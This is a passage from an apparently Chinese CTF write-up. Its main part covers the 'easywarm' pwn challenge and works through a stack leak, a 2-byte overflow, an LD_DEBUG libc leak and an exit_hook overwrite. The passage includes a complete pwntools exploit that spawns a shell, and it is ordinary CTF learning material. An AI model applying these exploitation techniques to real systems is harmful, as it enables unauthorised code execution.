class="comment"># group</span></span><br><span class="line">           <span class="number">0x2</span>, <span class="number">0x0</span>,  <span class="comment"># masks</span></span><br><span class="line">           last_value &amp; <span class="number">0xffffffff</span>, last_value &gt;&gt; <span class="number">32</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">prepare()</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">exit()</span><br><span class="line">sla(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="easywarm"><a href="#easywarm" class="headerlink" title="easywarm"></a>easywarm</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">easywarm: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=e708c2433f22dc346ad3b92573800150c429996f, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序总体上是实现了一个走迷宫的小游戏，漏洞比较难找</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sizeg / numg &gt; <span class="number">15</span> &amp;&amp; sizeg / numg &lt;= <span class="number">32</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; sizeg / numg / <span class="number">2</span>; ++i )</span><br><span class="line">    v3 = <span class="number">2</span> * v3 + <span class="number">1</span>;</span><br><span class="line">  v2 = v3 &amp; (<span class="keyword">unsigned</span> __int64)&amp;v2;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;flag: %lu\n&quot;</span>, v3 &amp; (<span class="keyword">unsigned</span> __int64)&amp;v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以泄露 stack_addr 的后4位</li>
</ul>
<p>程序设置了一个可疑的中断处理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signal(<span class="number">8</span>, (<span class="keyword">__sighandler_t</span>)hander2);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(*(<span class="keyword">void</span> **)(key_buf.argv + <span class="number">8</span>), <span class="string">&quot;666&quot;</span>, <span class="number">3uLL</span>);</span><br><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">readlink(<span class="string">&quot;/proc/self/exe&quot;</span>, s, <span class="number">0xFF</span>uLL);</span><br><span class="line">execve(s, (<span class="keyword">char</span> *<span class="keyword">const</span> *)key_buf.argv, (<span class="keyword">char</span> *<span class="keyword">const</span> *)key_buf.env);</span><br></pre></td></tr></table></figure>
<p>找了半天也没弄懂该如何触发，最后在 nowork 中发现了端倪：（有一个除0操作被优化了）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;This is a gift for you ^_^ ~&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;# system(\&quot;/aidai/ash\&quot;); exists here.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;# I think you must be able to get flag.&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>另外程序还有一处溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;key_buf, <span class="number">0</span>, sizeg / numg / <span class="number">2</span> + <span class="number">80</span>);</span><br><span class="line">readn(&amp;key_buf, sizeg / numg / <span class="number">2</span> + <span class="number">80</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>在 key_buf 中可以溢出2字节</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>为了触发 stack_addr 泄露，必须先解决迷宫问题：</p>
<p>提取迷宫数据时往往会因为单位字符的长度不同而提取出错，这里我选择用正则表达式解决这个问题</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">maze = []</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    data = ru(<span class="string">&quot;\n&quot;</span>)[<span class="number">2</span>:-<span class="number">2</span>]</span><br><span class="line">    data = re.sub(<span class="string">&quot;🚩&quot;</span>,<span class="string">&quot;7&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;👴&quot;</span>,<span class="string">&quot;3&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;  &quot;</span>,<span class="string">&quot;1&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;██&quot;</span>,<span class="string">&quot;0&quot;</span>,data)</span><br><span class="line">    maze.append(data)</span><br></pre></td></tr></table></figure>
<p>走迷宫的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">v</span>):</span></span><br><span class="line">    v = [<span class="string">&#x27;0&#x27;</span> * <span class="built_in">len</span>(v[<span class="number">0</span>])] + v + [<span class="string">&#x27;0&#x27;</span> * <span class="built_in">len</span>(v[<span class="number">0</span>])]</span><br><span class="line">    v = [<span class="string">&#x27;0&#x27;</span> + i + <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> v]</span><br><span class="line">    v = [<span class="built_in">list</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> v]</span><br><span class="line"></span><br><span class="line">    x0, y0 = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v[<span class="number">0</span>])):</span><br><span class="line">            <span class="keyword">if</span> v[x][y] == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                x0, y0 = x, y</span><br><span class="line">    v[x0][y0] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">    ans = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">ans, v, x, y</span>):</span></span><br><span class="line">        <span class="keyword">if</span> v[x][y] == <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> v[x][y] != <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        v[x][y] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        action = [</span><br><span class="line">            [<span class="string">&#x27;w&#x27;</span>, x-<span class="number">1</span>, y],</span><br><span class="line">            [<span class="string">&#x27;s&#x27;</span>, x+<span class="number">1</span>, y],</span><br><span class="line">            [<span class="string">&#x27;a&#x27;</span>, x, y-<span class="number">1</span>],</span><br><span class="line">            [<span class="string">&#x27;d&#x27;</span>, x, y+<span class="number">1</span>],</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">for</span> ch, xx, yy <span class="keyword">in</span> action:</span><br><span class="line">            ans += [ch]</span><br><span class="line">            ok = dfs(ans, v, xx, yy)</span><br><span class="line">            <span class="keyword">if</span> ok:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            ans.pop()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    ok = dfs(ans, v, x0, y0)</span><br><span class="line">    <span class="keyword">return</span> ok, <span class="string">&#x27;&#x27;</span>.join(ans)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;LD_DEBUG=all&quot;</span></span><br><span class="line">sla(<span class="string">&quot;name: &quot;</span>,name)</span><br></pre></td></tr></table></figure>
<p>泄露栈地址后4字节后，配合2字节溢出覆盖 key_buf.env 低位，可以劫持环境变量到我们输入 name 的地方</p>
<p>看 wp 得知，设置环境变量 <code>LD_DEBUG=all</code>(12字节) 可以打印出 ld.so 加载库的时候的 log，因此可以得到 libc 的加载地址，效果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">13304</span>:    file=./libc<span class="number">-2.31</span>.so [<span class="number">0</span>];  needed by ./easywarm1 [<span class="number">0</span>]</span><br><span class="line"><span class="number">13304</span>:    file=./libc<span class="number">-2.31</span>.so [<span class="number">0</span>];  generating link <span class="built_in">map</span></span><br><span class="line"><span class="number">13304</span>:      dynamic: <span class="number">0x00007ffff7fbfb80</span>  base: <span class="number">0x00007ffff7dd5000</span>   size: <span class="number">0x00000000001f14d8</span></span><br><span class="line"><span class="number">13304</span>:        entry: <span class="number">0x00007ffff7dfc1f0</span>  phdr: <span class="number">0x00007ffff7dd5040</span>  phnum:                 <span class="number">14</span></span><br></pre></td></tr></table></figure>
<p>最后就是一个 libc 任意写，尝试打 exit_hook：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p rtld_lock_default_lock_recursive</span><br><span class="line">$<span class="number">1</span> = &#123;<span class="keyword">void</span> (<span class="keyword">void</span> *)&#125; <span class="number">0x7ffff7fd0150</span> &lt;rtld_lock_default_lock_recursive&gt;</span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x7ffff7fd0150</span></span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="number">&#x27;</span>P\x01\xfd\xf7\xff\x7f\x00\x00<span class="number">&#x27;</span></span><br><span class="line">ld<span class="number">-2.31</span>.so      <span class="number">0x7ffff7ffdf68</span> <span class="number">0x7ffff7fd0150</span></span><br></pre></td></tr></table></figure>
<p>PS：从 wp 中学到的，打 <code>__libc_atexit</code> 也是个不错的选择</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608                               __libc_atexit segment qword <span class="keyword">public</span> <span class="string">&#x27;DATA&#x27;</span> use64</span><br><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608                               assume cs:__libc_atexit</span><br><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608                               ;org <span class="number">1</span>ED608h</span><br><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608 E0 <span class="number">5</span>E <span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_1ED608 dq offset fcloseall_0        ; DATA XREF: sub_49930+<span class="number">1</span>DA↑o</span><br><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608                                                                       ; sub_5EED0+<span class="number">1672</span>↑o</span><br><span class="line">__libc_atexit:<span class="number">00000000001</span>ED608                                                                       ; sub_5EED0+<span class="number">1E37</span>↑o</span><br></pre></td></tr></table></figure>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./easywarm1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([challenge,<span class="string">&quot;000&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x180A)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;[-]&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">num,size</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot; complexity: &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line">    sla(<span class="string">&quot;length: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>(<span class="params">data</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;input: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic</span>():</span></span><br><span class="line">    cmd(<span class="number">0x666</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">v</span>):</span></span><br><span class="line">    v = [<span class="string">&#x27;0&#x27;</span> * <span class="built_in">len</span>(v[<span class="number">0</span>])] + v + [<span class="string">&#x27;0&#x27;</span> * <span class="built_in">len</span>(v[<span class="number">0</span>])]</span><br><span class="line">    v = [<span class="string">&#x27;0&#x27;</span> + i + <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> v]</span><br><span class="line">    v = [<span class="built_in">list</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> v]</span><br><span class="line"></span><br><span class="line">    x0, y0 = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v[<span class="number">0</span>])):</span><br><span class="line">            <span class="keyword">if</span> v[x][y] == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                x0, y0 = x, y</span><br><span class="line">    v[x0][y0] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">    ans = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">ans, v, x, y</span>):</span></span><br><span class="line">        <span class="keyword">if</span> v[x][y] == <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> v[x][y] != <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        v[x][y] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        action = [</span><br><span class="line">            [<span class="string">&#x27;w&#x27;</span>, x-<span class="number">1</span>, y],</span><br><span class="line">            [<span class="string">&#x27;s&#x27;</span>, x+<span class="number">1</span>, y],</span><br><span class="line">            [<span class="string">&#x27;a&#x27;</span>, x, y-<span class="number">1</span>],</span><br><span class="line">            [<span class="string">&#x27;d&#x27;</span>, x, y+<span class="number">1</span>],</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">for</span> ch, xx, yy <span class="keyword">in</span> action:</span><br><span class="line">            ans += [ch]</span><br><span class="line">            ok = dfs(ans, v, xx, yy)</span><br><span class="line">            <span class="keyword">if</span> ok:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            ans.pop()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    ok = dfs(ans, v, x0, y0)</span><br><span class="line">    <span class="keyword">return</span> ok, <span class="string">&#x27;&#x27;</span>.join(ans)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;LD_DEBUG=all&quot;</span></span><br><span class="line">sla(<span class="string">&quot;name: &quot;</span>,name)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">28</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">maze = []</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    data = ru(<span class="string">&quot;\n&quot;</span>)[<span class="number">2</span>:-<span class="number">2</span>]</span><br><span class="line">    data = re.sub(<span class="string">&quot;🚩&quot;</span>,<span class="string">&quot;7&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;👴&quot;</span>,<span class="string">&quot;3&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;  &quot;</span>,<span class="string">&quot;1&quot;</span>,data)</span><br><span class="line">    data = re.sub(<span class="string">&quot;██&quot;</span>,<span class="string">&quot;0&quot;</span>,data)</span><br><span class="line">    maze.append(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> maze:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">ok,ans = solve(maze)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(ans)&gt;<span class="number">96</span>:</span><br><span class="line">    exit()</span><br><span class="line">challenge(ans)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;flag: &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">96</span>+p16(leak_addr+<span class="number">136</span>)</span><br><span class="line">challenge(payload)</span><br><span class="line"></span><br><span class="line">magic()</span><br><span class="line">ru(<span class="string">&quot; dynamic: &quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>])*<span class="number">0x10</span></span><br><span class="line">libc_base =leak_addr - <span class="number">0x1eab80</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one_gadgets = [<span class="number">0xe6aee</span>,<span class="number">0xe6af1</span>,<span class="number">0xe6af4</span>]</span><br><span class="line">one_gadget = libc_base + one_gadgets[<span class="number">0</span>]</span><br><span class="line">exit_hook = libc_base + <span class="number">0x228f68</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">success(<span class="string">&quot;exit_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(exit_hook))</span><br><span class="line"></span><br><span class="line">offset = exit_hook - <span class="number">0xadad000</span></span><br><span class="line">success(<span class="string">&quot;offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Administrator mode&quot;</span>)</span><br><span class="line">sa(<span class="string">&quot;error?&quot;</span>,p64(offset))</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">sla(<span class="string">&quot;to record?&quot;</span>,p64(one_gadget)+<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="pipeline"><a href="#pipeline" class="headerlink" title="pipeline"></a>pipeline</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
